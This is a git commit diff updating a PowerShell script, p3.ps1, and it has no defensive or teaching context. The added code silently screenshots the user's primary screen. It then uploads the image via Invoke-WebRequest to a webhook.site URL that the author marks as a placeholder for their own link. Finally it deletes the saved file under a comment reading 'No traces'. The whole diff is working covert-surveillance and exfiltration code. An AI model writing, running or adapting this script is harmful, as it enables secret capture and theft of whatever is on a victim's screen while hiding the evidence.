1ab58c514bd5227323f9ea8490883f3a91808482
kiralight2923-debug <kiralight2923@gmail.com>
2025-12-28 12:54:04 +0530

    Update p3.ps1

--- p3.ps1
+++ p3.ps1
@@ -1,6 +1,18 @@
+$webhook = "https://webhook.site/ed6252c7-c2af-4b75-a059-97b062ba8d51"  # <-- APNA LINK YAHAN DALO
+$path = "$env:TEMP\capture.png"
+
+# Screenshot Capture
 Add-Type -AssemblyName System.Windows.Forms
 $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-$image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
-$graphic = [System.Drawing.Graphics]::FromImage($image)
-$graphic.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
-$image.Save("$env:TEMP\capture.png", [System.Drawing.Imaging.ImageFormat]::Png)
+$bmp = New-Object Drawing.Bitmap $screen.Width $screen.Height
+$graphics = [Drawing.Graphics]::FromImage($bmp)
+$graphics.CopyFromScreen($screen.Location, [Drawing.Point]::Empty, $screen.Size)
+$bmp.Save($path, [Drawing.Imaging.ImageFormat]::Png)
+
+# Send to Webhook
+Invoke-WebRequest -Uri $webhook -Method POST -InFile $path -ContentType "image/png" -UseBasicParsing
+
+# Cleanup (No traces)
+$graphics.Dispose()
+$bmp.Dispose()
+Remove-Item $path -Force
